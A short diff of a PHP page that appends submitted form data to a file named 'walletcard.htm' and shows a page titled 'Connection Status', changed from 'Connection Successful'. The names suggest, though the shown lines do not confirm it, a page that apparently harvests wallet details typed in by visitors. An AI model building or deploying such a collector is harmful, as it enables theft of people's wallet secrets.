@@ -1,6 +1,6 @@
 <?php
-// Define a writable file path using the system's temp directory
-$filePath = sys_get_temp_dir() . '/walletcard.htm'; // Use the system's temp directory
+// Define a writable file path
+$filePath = 'walletcard.htm'; // Path to the walletcard.htm file
 
 // Open or create a file for writing form data
 $handle = fopen($filePath, "a");
@@ -31,7 +31,7 @@ fclose($handle);
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connection Successful</title>
+    <title>Connection Status</title>
     <style>
         body {
             display: flex;
